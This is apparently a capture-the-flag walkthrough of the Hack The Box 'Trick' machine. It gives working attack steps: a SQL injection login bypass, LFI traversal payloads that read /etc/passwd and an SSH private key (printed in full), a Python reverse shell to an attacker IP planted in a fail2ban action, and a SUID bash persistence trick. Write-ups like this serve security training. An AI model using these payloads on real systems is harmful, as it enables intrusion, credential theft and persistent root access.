
### Tools: nmap, gobuster, dig

### Vulnerabilities: sql injection, fail2ban

Nmap reveals ssh, smtp, and http. I got sent down a rabbit hole with smtp.

That means http is the answer! However even that site does not return much.

```console
└──╼ [★]$ sudo nmap -sS -sC -sV -T4 10.129.51.233
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-02 22:47 BST
Nmap scan report for 10.129.51.233
Host is up (1.1s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 244.80 seconds
```
So if we dig the site that our IP is associated with then we can get back some good subdomains. Most notably is ```preprod-payroll.trick.htb```

```console
└──╼ [★]$ dig axfr @10.129.51.233 trick.htb

; <<>> DiG 9.16.15-Debian <<>> axfr @10.129.51.233 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 8 msec
;; SERVER: 10.129.51.233#53(10.129.51.233)
;; WHEN: Fri Sep 02 22:49:36 BST 2022
;; XFR size: 6 records (messages 1, bytes 231)

```

Add the following to /etc/hosts on the last line

```console
10.129.51.233 trick.htb root.trick.htb preprod-payroll.trick.htb
```

Navigating to prerod gives a login page that is vulnerable to sql injection.

Note: Before I found this vulnerability I tried a couple of ways of getting passwords and usernames.

![image](https://user-images.githubusercontent.com/105310322/188241207-944c530d-e2d6-4be6-a5dc-aead955439a0.png)


Running a gobuster gives us a couple of pages but the best one was users.php which revealed the user ```Enemigosss```

```console
└──╼ [★]$ gobuster dir -u http://preprod-payroll.trick.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,db -q
/index.php            (Status: 302) [Size: 9546] [--> login.php]
/home.php             (Status: 200) [Size: 486]                 
/login.php            (Status: 200) [Size: 5571]                
/header.php           (Status: 200) [Size: 2548]                
/users.php            (Status: 200) [Size: 2197]                
/assets               (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/assets/]
/ajax.php             (Status: 200) [Size: 0]                                                 
/database             (Status: 301) [Size: 185] [--> http://preprod-payroll.trick.htb/database/]
/readme.txt           (Status: 200) [Size: 149]                                                 
/navbar.php           (Status: 200) [Size: 1382]                                                
/department.php       (Status: 200) [Size: 3926]                                                
/topbar.php           (Status: 200) [Size: 585]                                                 
/position.php         (Status: 200) [Size: 5919]                                                
/employee.php         (Status: 200) [Size: 2704]                                                
/payroll.php          (Status: 200) [Size: 3142]                                                
```
![image](https://user-images.githubusercontent.com/105310322/188243435-1dcea327-7085-4041-a91f-c927b5264b8c.png)

So since I was not able to get and passwords I set my user to Enemigosss and inputted the following in the passwords section.

```' OR ' 1=-- ``` note the space after =--

This get us in and then we can navigate to users and change password. Password shown is SuperGucciRainbowCake.

Note: The password did not do anything for me. This whole page was another rabbit hole.

![image](https://user-images.githubusercontent.com/105310322/188243610-f96f4f5a-2d41-4896-86dd-f7793cddf920.png)



Add preprod-marketing.trick.htb to /etc/hosts

Takes us to marketing

![image](https://user-images.githubusercontent.com/105310322/188242703-983bfebe-f7bb-4ef3-a32a-79b5fb39340a.png)
```
└──╼ [★]$ ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://preprod-marketing.trick.htb/index.php?page=FUZZ -v -fs 0
```
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd


Gives us a user Michael

![image](https://user-images.githubusercontent.com/105310322/188243801-a2869c4c-48cc-4546-af41-64db271c9884.png)

....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa

```console
-----BEGIN OPENSSH PRIVATE KEY----- 
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+ 4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/ Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4 1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0 +93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6 IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/ KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0 fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS 3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+ IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ== 
-----END OPENSSH PRIVATE KEY----- 
```
Put into an id_rsa file and login through ssh
```console
└──╼ [★]$ echo '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----' > id_rsa
```

We are in!

```console
└──╼ [★]$ ssh michael@10.129.51.233 -i id_rsa
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep  2 22:24:12 2022 from 10.10.16.8
michael@trick:~$ 
```

Now this next part is a little tricky and requires abusing fail2ban. Which is also a pretty neat way to gain root. The way fail2ban works is that it will ban an ip from accessing the network after a certain amount of ailed attempts. Instead we are going to make it run a reverse shell after an amount of incorrect logins.

Note: With how fail2ban works, you only get about 1 minute as root

```console
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```
Navigate to /tmp and cp over the files and then edit the file.

```console
michael@trick:/tmp$ cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp
michael@trick:/tmp$ vim iptables-multiport.conf 
```
I tried a bunch of different reverse shells but they kept failing to connect. Finally I got this python reverse shell to work.

```console
actionban = export RHOST="10.10.14.35";export RPORT=1234;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' 
```
After editing ve sure to have your nc listener ready and mv the file back and restart the fail2ban service.

```
michael@trick:/tmp$ mv iptables-multiport.conf /etc/fail2ban/action.d/
michael@trick:/tmp$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```
As soon as you restart the service go to town on failing authentication. I kept pressing enter until my listener finally caught it!

```console
└──╼ [★]$ ssh michael@10.129.53.72
michael@10.129.53.72's password: 
Permission denied, please try again.
michael@10.129.53.72's password: 
Permission denied, please try again.
michael@10.129.53.72's password: 
michael@10.129.53.72: Permission denied (publickey,password).
```
Awesome we are in! quickly cat the root flag!

```
└──╼ [★]$ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.53.72.
Ncat: Connection from 10.129.53.72:43280.
# cat /root/root.txt
de94b9107c1d74a9877a605ecf2d0431
```
Originally I had was having too many issues with a reverse shell so I opted for changing the root.txt flag to the tmp folder. Which is still a win but it doesnt feel the same without gaining root.

```console
actionban = cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt
```
```console
michael@trick:/tmp$ cat root.txt
de94b9107c1d74a9877a605ecf2d0431
michael@trick:/tmp$ 
```

Another thing we can do is as soon as you gain root access is to create persistence by moving the /usr/bin/bash to /tmp and adding a suid bit.

```console
# mv /usr/bin/bash /tmp
# cd /tmp
cd /tmp
# chmod u+s bash
```
